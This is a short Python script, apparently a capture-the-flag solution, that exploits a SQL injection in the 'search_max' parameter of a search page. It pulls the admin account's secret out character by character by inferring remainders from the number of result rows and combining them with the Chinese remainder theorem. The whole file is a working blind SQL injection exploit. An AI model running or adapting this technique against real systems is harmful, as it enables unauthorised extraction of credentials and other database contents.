from ptrlib import *
import requests
import random

URL = 'http://moxxie.tk:8080/search.php'

dlist = [2, 3, 5, 7, 11, 13, 17, 19, 23]
flag = ""
for pos in range(1, 100):
    pairs = []
    random.shuffle(dlist)
    y = 1
    for divisor in dlist:
        payload = {
            'keyword': '',
            'search_max': f'(SELECT unicode(substr(secret, {pos}, 1)) FROM account WHERE name="admin") % {divisor}'
        }
        r = requests.get(URL, params=payload)
        result = r.text.count('<th scope="row">')
        pairs.append((result, divisor))
        y *= divisor
        if y >= 255: break
    print(pairs)
    x = crt(pairs)
    if x[0] == 0: break
    flag += chr(x[0])
    logger.info(flag)
